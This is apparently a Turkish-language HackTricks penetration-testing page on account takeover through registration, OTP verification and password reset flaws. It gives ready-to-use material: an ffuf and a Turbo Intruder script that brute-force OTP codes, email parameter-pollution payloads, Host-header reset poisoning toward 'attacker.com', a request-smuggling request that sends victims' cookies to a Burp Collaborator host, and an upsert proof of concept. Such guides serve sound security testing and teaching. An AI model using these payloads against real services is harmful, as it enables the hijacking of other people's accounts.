# Kayıt ve Hesap Ele Geçirme Zafiyetleri

{{#include ../banners/hacktricks-training.md}}

## Kayıt Yoluyla Ele Geçirme

### Yinelenen Kayıt

- Mevcut bir username kullanarak oluşturmayı dene
- E-postayı değiştirerek kontrol et:
- büyük harf kullanımı
- +1@
- e-postaya nokta ekle
- e-posta adında özel karakterler (%00, %09, %20)
- E-postadan sonra boş karakterler koy: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- E-posta sağlayıcısının canonicalization hilelerini dene (servise bağlı):
- Gmail noktaları ve subaddressing'i yok sayar: `victim+1@gmail.com`, `v.ic.tim@gmail.com` adresleri `victim@gmail.com`'a gider
- Bazı sağlayıcılar local-part'ta büyük/küçük harf duyarsızdır
- Bazı sağlayıcılar unicode confusables kabul eder. Homoglyphs ve soft hyphen `\u00AD`'ı local-part içinde dene
- Bunları şu amaçlarla kötüye kullan: benzersizlik kontrollerini atlatmak, duplicate accounts/workspace davetleri elde etmek, veya ele geçirme hazırlığı sırasında mağdurun kayıt olmasını engellemek (geçici DoS)

### Kullanıcı adı tespiti

Uygulama içinde bir username'in zaten kayıtlı olup olmadığını anlayıp anlayamadığını kontrol et.

- Farklı hata mesajları veya HTTP status kodları
- Zaman farkları (mevcut kullanıcı IdP/DB sorgulaması tetikleyebilir)
- Bilinen e-posta adresleri için kayıt formunun profil verilerini otomatik doldurması
- Takım/davet akışlarını kontrol et: bir e-posta girmek hesabın var olup olmadığını açığa çıkarabilir

### Parola Politikası

Yeni kullanıcı oluştururken parola politikasını kontrol et (zayıf parolalara izin verilip verilmediğini test et).  
Bu durumda kimlik bilgilerini bruteforce etmeyi deneyebilirsin.

### SQL Injection

[**Bu sayfayı kontrol et** ](sql-injection/index.html#insert-statement)kayıt formlarında **SQL Injections** yoluyla hesap ele geçirme veya bilgi çıkarma yöntemlerini öğrenmek için.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Zafiyetleri


{{#ref}}
saml-attacks/
{{#endref}}

### E-postayı Değiştirme

Kayıtlıyken e-postayı değiştirmeyi dene ve bu değişikliğin doğru şekilde doğrulanıp doğrulanmadığını ya da rastgele e-postalara değiştirilebileceğini kontrol et.

### Daha Fazla Kontrol

- **disposable emails** (mailinator, yopmail, 1secmail, vb.) kullanıp kullanamayacağını kontrol et veya `victim+mailinator@gmail.com` gibi subaddressing ile blocklist'i atlat
- **Uzun** **parola** (>200) **DoS**'a yol açabilir
- **Hesap oluşturma için rate limit'leri kontrol et**
- username@**burp_collab**.net kullan ve **callback**'i analiz et
- Telefon doğrulama kullanılıyorsa, telefon parsing/injection kenar durumlarını kontrol et

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Zayıf E‑posta/Telefon Doğrulaması (OTP/Magic Link)

Kayıt akışları genellikle sahipliği sayısal bir OTP veya magic-link token ile doğrular. Tipik hatalar:

- Tahmin edilebilir veya kısa OTP (4–6 hane) ve etkili rate limiting veya IP/cihaz takibi yok. Paralel denemeler ve header/IP rotasyonu dene.
- OTP'nin farklı işlemler veya hesaplar arasında yeniden kullanılması, ya da belirli kullanıcı/işlem ile bağlanmamış olması (ör. aynı kod hem login hem signup için geçerli veya e-posta değişikliğinden sonra çalışıyor).
- Çok-değer smuggling: bazı backend'ler birden fazla kod kabul eder ve herhangi biri eşleşiyorsa doğrular. Şunları dene:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: status/mesaj/gövde uzunluğuna göre yanlış vs süresi dolmuş vs yanlış-kullanıcı kodlarını ayırt et.
- Token'ların başarı sonrası veya parola/e-posta değişikliğinden sonra geçersizleşmemesi.
- Doğrulama token'ının user agent/IP ile ilişkilendirilmemesi, saldırgan kontrolündeki sayfalardan cross-origin tamamlamaya izin verebilir.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Sıralı kilitlemeleri atlatmak için paralel/eşzamanlı tahminler (Burp'ta Turbo Intruder kullanın):

<details>
<summary>Turbo Intruder ile 6 haneli OTP denemelerini floodlamak için snippet</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Doğrulamayı yarışma yoluyla deneyin: aynı geçerli OTP'yi eşzamanlı iki oturumda gönderin; bazen bir oturum doğrulanmış saldırgan hesabı olurken mağdur akışı da başarılı olur.
- Doğrulama bağlantılarında Host header poisoning'i de test edin (aşağıdaki reset poisoning ile aynı) saldırgana ait bir host üzerinde doğrulamayı leak etmek veya tamamlamak için.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Güçlü bir sorun sınıfı, saldırganın mağdur hesap oluşturmadan önce mağdurun e-postası üzerinde işlem yapıp daha sonra erişimi geri kazanması durumunda ortaya çıkar.

Test edilecek ana teknikler (hedefin akışına uyarlayın):

- Classic–Federated Merge
  - Saldırgan: mağdur e-postasıyla classic bir hesap kaydeder ve bir parola belirler
  - Mağdur: daha sonra aynı e-posta ile SSO üzerinden kayıt olur
  - Güvensiz merge'ler her iki tarafın da oturumunun açık kalmasına veya saldırganın erişiminin yeniden canlanmasına yol açabilir
- Unexpired Session Identifier
  - Saldırgan: hesap oluşturur ve uzun ömürlü bir oturumu açık tutar (oturumu kapatmayın)
  - Mağdur: hesabı kurtarır/parolayı sıfırlar ve hesabı kullanmaya başlar
  - Eski oturumların reset veya MFA etkinleştirmeden sonra geçerli kalıp kalmadığını test edin
- Trojan Identifier
  - Saldırgan: önceden oluşturulmuş hesaba ikincil bir tanımlayıcı ekler (telefon, ek e-posta veya saldırganın IdP'sine link)
  - Mağdur: parolayı sıfırlar; saldırgan daha sonra trojan tanımlayıcıyı kullanarak sıfırlama/giriş yapar
- Unexpired Email Change
  - Saldırgan: e-posta değişikliğini saldırgan e-postasına başlatır ve onayı bekletir
  - Mağdur: hesabı kurtarır ve kullanmaya başlar
  - Saldırgan: daha sonra bekleyen e-posta değişikliğini tamamlayarak hesabı çalar
- Non‑Verifying IdP
  - Saldırgan: e-posta sahipliğini doğrulamayan bir IdP kullanarak `victim@…` iddiasında bulunur
  - Mağdur: classic yolla kayıt olur
  - Servis, `email_verified` kontrol etmeden veya yerel doğrulama yapmadan e-posta üzerinden merge eder

Pratik ipuçları

- Web/mobile bundle'larından akışları ve endpoint'leri toplayın. Classic signup, SSO linking, email/phone change ve password reset endpoint'lerini arayın.
- Diğer akışları test ederken oturumları açık tutmak için gerçekçi otomasyonlar oluşturun.
- SSO testleri için bir test OIDC provider kurun ve mağdur adresi için `email` claim'leri ve `email_verified=false` içeren tokenlar vererek RP'nin doğrulanmamış IdP'lere güvenip güvenmediğini kontrol edin.
- Her parola sıfırlama veya e-posta değişikliğinden sonra doğrulayın:
  - all other sessions and tokens are invalidated,
  - pending email/phone change capabilities are cancelled,
  - previously linked IdPs/emails/phones are re‑verified.

Not: Bu tekniklerin geniş metodolojisi ve vaka çalışmaları Microsoft’un pre‑hijacking araştırması tarafından belgelenmiştir (son kısımdaki References'a bakın).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Kendi e-posta adresinize parola sıfırlama talebi gönderin
2. Parola sıfırlama bağlantısına tıklayın
3. Parolayı değiştirmeyin
4. Herhangi bir 3rd party siteye tıklayın (ör. Facebook, Twitter)
5. İsteği Burp Suite proxy'sinde yakalayın
6. Referer header'ının password reset token'ı leak edip etmediğini kontrol edin.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Parola sıfırlama isteğini Burp Suite'te yakalayın
2. Burp Suite'te aşağıdaki header'ları ekleyin veya düzenleyin: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Değiştirilmiş header ile isteği iletin\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_ bazlı bir password reset URL'si arayın, ör: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Saldırgan kendi hesabıyla giriş yapıp **Change password** özelliğine gitmeli.
2. Burp Suite'i başlatın ve isteği Intercept edin
3. İsteği repeater sekmesine gönderin ve parametreleri düzenleyin: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Parola sıfırlama tokeni rastgele oluşturulmalı ve her seferinde benzersiz olmalıdır.\
Tokenin süresinin dolup dolmadığını veya her zaman aynı olup olmadığını tespit etmeye çalışın; bazı durumlarda üretim algoritması zayıftır ve tahmin edilebilir. Aşağıdaki değişkenler algoritma tarafından kullanılabilir.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Belirli bir e-posta için API/UI üzerinden parola sıfırlama isteği tetikleyin, örn: test@mail.com
2. Sunucu yanıtını inceleyin ve `resetToken`'ı kontrol edin
3. Ardından tokeni şu gibi bir URL'de kullanın: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Sisteme, hedefin kullanıcı adıyla aynı olan ancak kullanıcı adının önüne ve/veya sonuna boşluk karakterleri eklenmiş bir kullanıcı adıyla kayıt olun. örn: `"admin "`
2. Kötü niyetli kullanıcı adınızla parola sıfırlama isteği gönderin.
3. E-postanıza gelen tokeni kullanarak hedefin parolasını sıfırlayın.
4. Yeni parola ile hedef hesabına giriş yapın.

The platform CTFd was vulnerable to this attack.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Uygulama içinde veya çerezlerin parent domain'e scope edildiği bir subdomainde XSS bulun: `*.domain.com`
2. Leak the current **sessions cookie**
3. Bu cookie'yi kullanarak kullanıcı olarak kimlik doğrulayın

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. HTTP Request Smuggling (CL, TE, CL.TE) türünü tespit etmek için **smuggler**'ı kullanın\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Aşağıdaki verilerle `POST / HTTP/1.1`'i overwrite edecek bir istek oluşturun:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` — amaç mağdurları burpcollab'a open redirect ile yönlendirip çerezlerini çalmaktır\
3. Son istek aşağıdaki gibi görünebilir
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone, bu hatanın istismar edildiğini bildirdi\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### CSRF ile Hesap Ele Geçirme <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF için bir payload oluşturun, örn: “HTML form with auto submit for a password change”
2. Payload'ı gönderin

### JWT ile Hesap Ele Geçirme <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token, bir kullanıcının kimlik doğrulaması için kullanılabilir.

- JWT'yi başka bir User ID / Email ile düzenleyin
- Zayıf JWT imzasını kontrol edin


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Kayıt olarak Sıfırlama (Upsert on Existing Email)

Bazı kayıt işleyicileri, sağlanan e-posta zaten mevcutsa upsert gerçekleştirir. Eğer endpoint, bir e-posta ve parola içeren minimal bir body kabul ediyor ve sahiplik doğrulaması uygulamıyorsa, hedefin e-postasını göndererek pre-auth parolası üzerine yazılır.

- Keşif: bundled JS (veya mobile app trafiği) içinden endpoint isimlerini toplayın, sonra ffuf/dirsearch kullanarak /parents/application/v4/admin/FUZZ gibi base path'leri fuzz'leyin.
- Yöntem ipuçları: "Only POST request is allowed." gibi mesaj döndüren bir GET genellikle doğru verb'ün POST olduğunu ve bir JSON body beklendiğini gösterir.
- Gerçekte gözlemlenen minimal body:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Örnek PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Etkisi: Herhangi bir reset token, OTP veya e-posta doğrulaması olmadan Tam Hesap Ele Geçirme (ATO).

## Referanslar

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
